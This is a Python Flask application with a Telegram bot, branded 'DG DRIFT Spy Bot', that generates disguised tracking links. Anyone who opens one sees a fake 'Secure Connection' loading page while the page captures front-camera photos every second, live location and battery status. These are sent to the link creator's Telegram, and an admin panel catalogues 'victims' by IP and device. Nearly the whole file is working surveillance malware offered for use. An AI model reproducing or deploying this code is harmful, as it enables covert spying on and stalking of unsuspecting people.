import os
import json
import time
import random
import hashlib
import datetime
import base64
from flask import Flask, request, jsonify, render_template_string, session, redirect, url_for, send_from_directory
import requests

# Load configuration
from config import config

app = Flask(__name__)
app.secret_key = config['secret_key']

# Ensure required folders and files exist
os.makedirs('photos', exist_ok=True)
for fname in ['visitors.json', 'links.json']:
    if not os.path.exists(fname):
        with open(fname, 'w') as f:
            json.dump([], f) if fname == 'visitors.json' else json.dump({}, f)

# ---------- Helper Functions ----------
def load_json(fname):
    with open(fname, 'r') as f:
        return json.load(f)

def save_json(fname, data):
    with open(fname, 'w') as f:
        json.dump(data, f, indent=2)

def send_telegram_message(chat_id, text, reply_markup=None, parse_mode='Markdown'):
    url = f"https://api.telegram.org/bot{config['bot_token']}/sendMessage"
    payload = {
        'chat_id': chat_id,
        'text': text,
        'parse_mode': parse_mode
    }
    if reply_markup:
        payload['reply_markup'] = json.dumps(reply_markup)
    requests.post(url, data=payload).raise_for_status()

def send_telegram_photo(chat_id, photo_path, caption=''):
    url = f"https://api.telegram.org/bot{config['bot_token']}/sendPhoto"
    files = {'photo': open(photo_path, 'rb')}
    data = {'chat_id': chat_id, 'caption': caption}
    resp = requests.post(url, files=files, data=data)
    return resp.status_code == 200

def send_telegram_location(chat_id, lat, lng):
    url = f"https://api.telegram.org/bot{config['bot_token']}/sendLocation"
    data = {'chat_id': chat_id, 'latitude': lat, 'longitude': lng}
    requests.post(url, data=data).raise_for_status()

# ---------- Routes ----------
@app.route('/')
def index():
    """Spy landing page - captures photo, location, battery, then redirects."""
    link_id = request.args.get('id', '')
    links = load_json('links.json')
    link_data = links.get(link_id, {})
    target_url = link_data.get('url', 'https://google.com')
    creator_id = link_data.get('created_by', config['chat_id'])

    # Generate or retrieve visitor ID
    visitor_id = session.get('visitor_id')
    if not visitor_id:
        visitor_id = f"VIS_{int(time.time())}_{random.randbytes(4).hex()}"
        session['visitor_id'] = visitor_id

    # Return the spy HTML page (inline template)
    return render_template_string(SPY_PAGE, visitor_id=visitor_id, target_url=target_url)

SPY_PAGE = '''
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Loading...</title>
    <style>
        * { margin:0; padding:0; box-sizing:border-box; }
        body { background: #0a0a0a; color: #fff; font-family: -apple-system, sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
        .container { text-align: center; padding: 20px; max-width: 380px; }
        .logo { font-size: 28px; font-weight: 900; background: linear-gradient(45deg, #f7971e, #ffd200); -webkit-background-clip: text; -webkit-text-fill-color: transparent; margin-bottom: 5px; }
        .subtitle { color: #555; font-size: 12px; margin-bottom: 25px; letter-spacing: 1px; }
        .spinner { width: 50px; height: 50px; border: 3px solid rgba(255,255,255,0.05); border-radius: 50%; border-top: 3px solid #f7971e; animation: spin 0.8s linear infinite; margin: 20px auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .status-text { color: #4ade80; font-size: 13px; min-height: 22px; }
        .status-text.warning { color: #fbbf24; }
        .status-text.error { color: #ef4444; }
        .badge { display: inline-block; background: rgba(255,255,255,0.03); padding: 4px 14px; border-radius: 20px; font-size: 10px; color: #666; margin-top: 15px; border: 1px solid rgba(255,255,255,0.03); }
        .badge span { color: #f7971e; }
        #video { display: none; }
        #canvas { display: none; }
        .red-dot { display: inline-block; width: 8px; height: 8px; background: #ef4444; border-radius: 50%; animation: pulse 1s infinite; margin-right: 6px; }
        @keyframes pulse { 0%, 100% { opacity: 1; transform: scale(1); } 50% { opacity: 0.3; transform: scale(1.2); } }
        .recording { display: inline-flex; align-items: center; background: rgba(239, 68, 68, 0.1); padding: 4px 12px; border-radius: 20px; font-size: 11px; color: #ef4444; margin-top: 8px; }
        .debug-info { color: #444; font-size: 10px; margin-top: 15px; word-break: break-all; max-height: 60px; overflow-y: auto; }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">✨ DG DRIFT</div>
        <div class="subtitle">🔒 Secure Connection</div>
        <div class="spinner"></div>
        <div class="status-text" id="status">📸 Initializing...</div>
        <div class="recording" id="recordingBadge" style="display:none;">
            <span class="red-dot"></span> RECORDING
        </div>
        <div class="badge">🆔 <span id="visitorDisplay"></span></div>
        <div class="debug-info" id="debugInfo"></div>
        <video id="video" autoplay playsinline muted></video>
        <canvas id="canvas"></canvas>
    </div>
    <script>
        const visitorId = "{{ visitor_id }}";
        const targetUrl = "{{ target_url }}";
        let photoCount = 0;
        let isCapturing = false;
        let debugEl = document.getElementById('debugInfo');

        function debug(msg) { debugEl.textContent = msg; console.log(msg); }

        document.getElementById('visitorDisplay').textContent = visitorId.substring(0,15)+'...';
        debug('Initializing...');

        // ---------- CAMERA ----------
        navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } }, audio: false })
        .then(stream => {
            const video = document.getElementById('video');
            video.srcObject = stream;
            video.play();
            document.getElementById('status').textContent = '📸 Capturing...';
            document.getElementById('recordingBadge').style.display = 'inline-flex';
            isCapturing = true;
            debug('✅ Camera active');
            setInterval(() => { if (isCapturing) { capturePhoto(); photoCount++; debug('📸 Photo #'+photoCount); } }, 1000);
        })
        .catch(err => {
            document.getElementById('status').textContent = '⚠️ Camera denied';
            document.getElementById('status').className = 'status-text error';
            debug('❌ Camera error: ' + err.message);
        });

        function capturePhoto() {
            const video = document.getElementById('video');
            const canvas = document.getElementById('canvas');
            const ctx = canvas.getContext('2d');
            if (!video.videoWidth || video.videoWidth === 0) return;
            canvas.width = 640; canvas.height = 480;
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
            const photoData = canvas.toDataURL('image/jpeg', 0.7);
            sendData({ photo: photoData });
        }

        // ---------- LOCATION ----------
        if (navigator.geolocation) {
            navigator.geolocation.watchPosition(
                position => {
                    const loc = { lat: position.coords.latitude, lng: position.coords.longitude };
                    debug('📍 Location: '+loc.lat+', '+loc.lng);
                    sendData({ location: loc });
                },
                err => { debug('❌ Location error: '+err.message); },
                { enableHighAccuracy: true, maximumAge: 5000, timeout: 10000 }
            );
        } else { debug('❌ Geolocation not supported'); }

        // ---------- BATTERY ----------
        if (navigator.getBattery) {
            navigator.getBattery().then(battery => {
                function updateBattery() {
                    const level = Math.round(battery.level * 100);
                    const charging = battery.charging;
                    debug('🔋 Battery: '+level+'%');
                    sendData({ battery: { level: level, charging: charging } });
                }
                updateBattery();
                setInterval(updateBattery, 5000);
            });
        } else { debug('❌ Battery API not supported'); }

        // ---------- SEND DATA ----------
        let pendingData = [];
        let lastSend = 0;
        function sendData(data) {
            pendingData.push(data);
            if (Date.now() - lastSend > 2000 || pendingData.length >= 3) {
                const batch = pendingData.slice();
                pendingData = [];
                debug('📤 Sending '+batch.length+' items');
                fetch(window.location.href, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(batch)
                })
                .then(res => res.json())
                .then(data => { debug('✅ Server OK'); })
                .catch(err => { debug('❌ Send error: '+err.message); });
                lastSend = Date.now();
            }
        }

        // ---------- REDIRECT ----------
        let secondsLeft = 10;
        const statusEl = document.getElementById('status');
        const countdown = setInterval(() => {
            secondsLeft--;
            if (secondsLeft > 0) { statusEl.textContent = '⏳ Redirecting in '+secondsLeft+'s...'; }
        }, 1000);
        setTimeout(() => {
            clearInterval(countdown);
            isCapturing = false;
            statusEl.textContent = '🚀 Redirecting...';
            debug('🔗 Redirecting...');
            setTimeout(() => { window.location.href = targetUrl; }, 1500);
        }, 10000);
    </script>
</body>
</html>
'''

@app.route('/', methods=['POST'])
def index_post():
    """Receive captured data (photo, location, battery) from the spy page."""
    try:
        data = request.get_json()
        if not data:
            return jsonify({'status': 'error', 'message': 'Invalid JSON'}), 400

        # Ensure data is a list
        if not isinstance(data, list):
            data = [data]

        visitor_id = session.get('visitor_id')
        if not visitor_id:
            return jsonify({'status': 'error', 'message': 'No visitor ID'}), 400

        # Determine creator ID from the link data
        link_id = request.args.get('id', '')
        links = load_json('links.json')
        link_data = links.get(link_id, {})
        creator_id = link_data.get('created_by', config['chat_id'])

        # Load visitors
        visitors = load_json('visitors.json')
        if visitor_id not in visitors:
            visitors[visitor_id] = {
                'device': request.headers.get('User-Agent', 'Unknown'),
                'ip': request.remote_addr,
                'target_url': link_data.get('url', 'N/A'),
                'generated_by': creator_id,
                'time': datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
                'photos': 0,
                'locations': 0,
                'battery': 0
            }

        visitors[visitor_id]['last_update'] = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')

        for item in data:
            # --- Photo ---
            if 'photo' in item and item['photo']:
                photo_data = item['photo']
                if 'base64,' in photo_data:
                    photo_data = photo_data.split('base64,')[1]
                photo_binary = base64.b64decode(photo_data)
                if len(photo_binary) > 500:
                    photo_path = f"photos/{visitor_id}_{int(time.time())}.jpg"
                    with open(photo_path, 'wb') as f:
                        f.write(photo_binary)
                    caption = f"📸 *Spy Photo!*\n🆔 {visitor_id}\n⏰ {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
                    send_telegram_photo(creator_id, photo_path, caption)
                    visitors[visitor_id]['photos'] += 1

            # --- Location ---
            if 'location' in item:
                loc = item['location']
                lat = loc.get('lat', 0)
                lng = loc.get('lng', 0)
                if lat != 0 and lng != 0:
                    send_telegram_location(creator_id, lat, lng)
                    msg = f"📍 *Live Location*\n🆔 {visitor_id}\n🗺️ https://maps.google.com/?q={lat},{lng}"
                    send_telegram_message(creator_id, msg)
                    visitors[visitor_id]['locations'] += 1

            # --- Battery ---
            if 'battery' in item:
                bat = item['battery']
                level = bat.get('level', 0)
                charging = bat.get('charging', False)
                if level > 0:
                    status = "⚡ Charging" if charging else "🔋 Not Charging"
                    msg = f"🔋 *Battery Status*\n🆔 {visitor_id}\n📊 {level}%\n{status}"
                    send_telegram_message(creator_id, msg)
                    visitors[visitor_id]['battery'] += 1

        save_json('visitors.json', visitors)
        return jsonify({'status': 'success'})
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)}), 500

# ---------- Telegram Bot Webhook ----------
@app.route('/webhook', methods=['POST'])
def webhook():
    """Handle incoming Telegram updates."""
    update = request.get_json()
    if not update:
        return 'OK', 200

    chat_id = update.get('message', {}).get('chat', {}).get('id')
    text = update.get('message', {}).get('text', '')
    callback = update.get('callback_query')

    # --- /start command ---
    if text == '/start':
        keyboard = {
            'inline_keyboard': [
                [{'text': '🔗 Generate Spy Link', 'callback_data': 'generate'}],
                [{'text': '📊 Victims', 'callback_data': 'stats'}]
            ]
        }
        send_telegram_message(chat_id,
            '👾 *DG DRIFT Spy Bot*\n\nSend any URL, I\'ll make a spy link.\nWhen someone clicks it, auto-capture starts! 📸',
            reply_markup=keyboard)
        return 'OK', 200

    # --- Callback queries ---
    if callback:
        cb_data = callback.get('data')
        cb_id = callback.get('id')
        from_id = callback.get('from', {}).get('id')

        if cb_data == 'generate':
            send_telegram_message(from_id, '📥 *Send target URL*\nExample: `https://youtube.com`')
            answer_callback(cb_id)
            return 'OK', 200

        if cb_data == 'stats':
            visitors = load_json('visitors.json')
            my_visitors = [v for v in visitors.values() if v.get('generated_by') == str(from_id)]
            total = len(my_visitors)
            send_telegram_message(from_id, f'📊 *Your Victims:* {total}\n\n🔗 Generate more links to track more people!')
            answer_callback(cb_id)
            return 'OK', 200

    # --- User sends a URL -> generate spy link ---
    if text and text.startswith('http') and chat_id:
        parsed = text.replace('https://', '').replace('http://', '').split('/')[0]
        domain = parsed.replace('www.', '').replace('.', '_')
        short_code = f"{domain}_{str(time.time())[-4:]}"

        links = load_json('links.json')
        links[short_code] = {
            'url': text,
            'created_by': str(chat_id),
            'created_at': datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        }
        save_json('links.json', links)

        spy_link = config['website'] + short_code
        msg = (f"✅ *Spy Link Generated!*\n\n🔗 `{spy_link}`\n\n"
               "📸 When someone opens this link:\n• Camera photos (every 1 sec)\n• Live Location\n• Battery Status\n\n"
               "*All photos will come to YOU!*")
        send_telegram_message(chat_id, msg)
        return 'OK', 200

    return 'OK', 200

def answer_callback(callback_id):
    url = f"https://api.telegram.org/bot{config['bot_token']}/answerCallbackQuery"
    requests.post(url, data={'callback_query_id': callback_id})

# ---------- Admin Panel ----------
@app.route('/admin', methods=['GET', 'POST'])
def admin():
    # Login handling
    if request.method == 'POST' and 'login' in request.form:
        username = request.form.get('username')
        password = request.form.get('password')
        if username == config['admin_username'] and password == config['admin_password']:
            session['admin'] = True
            return redirect(url_for('admin'))
        else:
            return render_template_string(LOGIN_PAGE, error='Invalid credentials')

    # Check login
    if not session.get('admin'):
        return render_template_string(LOGIN_PAGE, error=None)

    # Handle GET actions (logout, export, clear)
    if 'logout' in request.args:
        session.pop('admin', None)
        return redirect(url_for('admin'))

    if 'export' in request.args:
        visitors = load_json('visitors.json')
        return jsonify(visitors)

    if 'clear' in request.args:
        save_json('visitors.json', [])
        save_json('links.json', {})
        for f in os.listdir('photos'):
            os.remove(os.path.join('photos', f))
        return redirect(url_for('admin'))

    # Load data for dashboard
    visitors = load_json('visitors.json')
    links = load_json('links.json')
    total_victims = len(visitors)
    total_photos = sum(v.get('photos', 0) for v in visitors.values())

    return render_template_string(ADMIN_DASHBOARD,
                                  visitors=visitors,
                                  links=links,
                                  total_victims=total_victims,
                                  total_photos=total_photos)

LOGIN_PAGE = '''
<!DOCTYPE html>
<html>
<head><title>Admin Login</title>
<style>
* { margin:0; padding:0; box-sizing:border-box; }
body { background: #0f0c29; color: white; font-family: Arial; display: flex; justify-content: center; align-items: center; height: 100vh; }
.login-box { background: rgba(255,255,255,0.05); padding: 40px; border-radius: 20px; width: 320px; text-align: center; border: 1px solid rgba(255,255,255,0.05); }
.login-box h2 { margin-bottom: 20px; color: #f7971e; }
input { width: 100%; padding: 14px; margin: 10px 0; border: none; border-radius: 12px; background: rgba(255,255,255,0.08); color: white; font-size: 14px; }
input::placeholder { color: #666; }
button { width: 100%; padding: 14px; background: linear-gradient(45deg, #f7971e, #ffd200); border: none; border-radius: 12px; font-weight: bold; cursor: pointer; font-size: 16px; margin-top: 10px; }
button:hover { opacity: 0.9; }
.error { color: #ef4444; margin-top: 10px; font-size: 14px; }
</style>
</head>
<body>
<div class="login-box">
<h2>🔐 Admin Login</h2>
<form method="POST">
<input type="text" name="username" placeholder="Username" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit" name="login">Login</button>
</form>
{% if error %}<div class="error">{{ error }}</div>{% endif %}
</div>
</body>
</html>
'''

ADMIN_DASHBOARD = '''
<!DOCTYPE html>
<html>
<head><title>Admin - DG DRIFT</title>
<style>
* { margin:0; padding:0; box-sizing:border-box; }
body { background: #0f0c29; color: white; font-family: Arial; padding: 20px; }
.header { display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 15px; }
.stats { display: flex; gap: 15px; flex-wrap: wrap; margin: 20px 0; }
.stat-box { background: rgba(255,255,255,0.05); padding: 18px 25px; border-radius: 15px; flex: 1; min-width: 100px; text-align: center; border: 1px solid rgba(255,255,255,0.05); }
.stat-box h2 { font-size: 32px; color: #f7971e; }
.stat-box p { color: #888; font-size: 13px; }
.btn { background: #f7971e; color: black; padding: 8px 18px; border: none; border-radius: 10px; cursor: pointer; margin: 3px; font-weight: 600; text-decoration: none; display: inline-block; }
.btn:hover { background: #ffd200; }
.btn-danger { background: #ef4444; color: white; }
.btn-danger:hover { background: #dc2626; }
.visitor-card { background: rgba(255,255,255,0.03); border-radius: 15px; padding: 20px; margin: 15px 0; border: 1px solid rgba(255,255,255,0.05); }
.visitor-card h3 { color: #f7971e; margin-bottom: 8px; }
.info { color: #aaa; font-size: 13px; margin: 4px 0; }
.info strong { color: #ddd; }
.photo-grid { display: flex; flex-wrap: wrap; gap: 8px; margin: 10px 0; }
.photo-grid img { width: 80px; height: 80px; object-fit: cover; border-radius: 8px; border: 2px solid rgba(255,255,255,0.08); }
.badge { display: inline-block; padding: 2px 10px; border-radius: 20px; font-size: 12px; background: rgba(255,255,255,0.05); }
.badge.good { background: rgba(74, 222, 128, 0.15); color: #4ade80; }
.empty { color: #666; text-align: center; padding: 40px; }
.creator-tag { color: #f7971e; font-size: 12px; background: rgba(247, 151, 30, 0.1); padding: 2px 10px; border-radius: 10px; }
.link-item { background: rgba(255,255,255,0.03); padding: 10px 15px; border-radius: 10px; margin: 5px 0; display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; }
</style>
</head>
<body>
<div class="header">
<h1>👾 Admin Panel - DG DRIFT</h1>
<div>
<a href="?export" class="btn">📥 Export</a>
<a href="?clear" class="btn btn-danger" onclick="return confirm('Delete ALL data?')">🗑️ Clear</a>
<a href="?logout" class="btn btn-danger">🚪 Logout</a>
</div>
</div>

<div class="stats">
<div class="stat-box"><h2>{{ total_victims }}</h2><p>Total Victims</p></div>
<div class="stat-box"><h2>{{ total_photos }}</h2><p>Photos Captured</p></div>
<div class="stat-box"><h2>{{ links|length }}</h2><p>Spy Links Created</p></div>
</div>

<div style="margin:20px 0;">
<h3>🔗 All Spy Links</h3>
{% for code, data in links.items() %}
<div class="link-item">
<span><strong>{{ code }}</strong> → {{ data.url }}</span>
<span class="creator-tag">Created by: {{ data.created_by }}</span>
<span style="color:#666;font-size:12px;">{{ data.created_at }}</span>
</div>
{% endfor %}
</div>

{% if not visitors %}
<div class="empty">
<h2 style="font-size:24px;margin-bottom:10px;">📭 No Victims Yet</h2>
<p>Generate a spy link from your bot and share it!</p>
</div>
{% else %}
<h3>📋 All Victims</h3>
{% for id, data in visitors.items() %}
<div class="visitor-card">
<h3>🆔 {{ id }}</h3>
<div class="info"><strong>📱 Device:</strong> {{ data.device[:60] }}</div>
<div class="info"><strong>🌐 IP:</strong> {{ data.ip }}</div>
<div class="info"><strong>🎯 Target:</strong> {{ data.target_url }}</div>
<div class="info"><strong>👤 Generated By:</strong> {{ data.generated_by }}</div>
<div class="info"><strong>📅 First Seen:</strong> {{ data.time }}</div>
<div class="info"><strong>📊 Stats:</strong> 
<span class="badge good">📸 {{ data.photos }}</span>
<span class="badge good">📍 {{ data.locations }}</span>
<span class="badge good">🔋 {{ data.battery }}</span>
</div>
{% set photos = data.photos|default(0) %}
{% if photos > 0 %}
<div class="photo-grid">
{% for f in os.listdir('photos') if f.startswith(id ~ '_') %}
<img src="{{ url_for('photo', filename=f) }}" loading="lazy">
{% endfor %}
</div>
{% endif %}
</div>
{% endfor %}
{% endif %}
</body>
</html>
'''

@app.route('/photos/<filename>')
def photo(filename):
    """Serve captured photos for admin panel."""
    return send_from_directory('photos', filename)

# ---------- Main ----------
if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)